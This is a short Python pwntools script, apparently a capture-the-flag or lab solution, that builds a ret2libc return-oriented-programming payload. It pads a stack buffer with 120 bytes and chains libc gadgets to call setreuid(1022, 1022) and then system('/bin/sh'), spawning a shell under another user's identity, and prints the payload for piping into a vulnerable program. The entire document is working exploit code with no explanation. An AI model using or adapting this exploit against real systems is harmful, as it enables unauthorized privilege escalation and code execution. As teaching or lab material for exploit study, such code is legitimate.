from pwn import *

context.arch = "amd64"
context.log_level = 'critical'

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address = 0x7ffff7c00000

rop = ROP(libc)

ROP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
ROP_RSI = rop.find_gadget(["pop rsi", "pop r15", "ret"])[0]

SETREUID = libc.sym["setreuid"]
SYSTEM = libc.sym["system"]

BIN_SH = next(libc.search(b"/bin/sh"))

rop_chain = b""
rop_chain += p64(ROP_RDI)
rop_chain += p64(1022)
rop_chain += p64(ROP_RSI)
rop_chain += p64(1022)
rop_chain += p64(0xdeadbeef)
rop_chain += p64(SETREUID)
rop_chain += p64(ROP_RDI)
rop_chain += p64(BIN_SH)
rop_chain += p64(rop.ret[0])
rop_chain += p64(SYSTEM)

payload = b"A" * 120
payload += rop_chain
payload += b"\n"

sys.stdout.buffer.write(payload)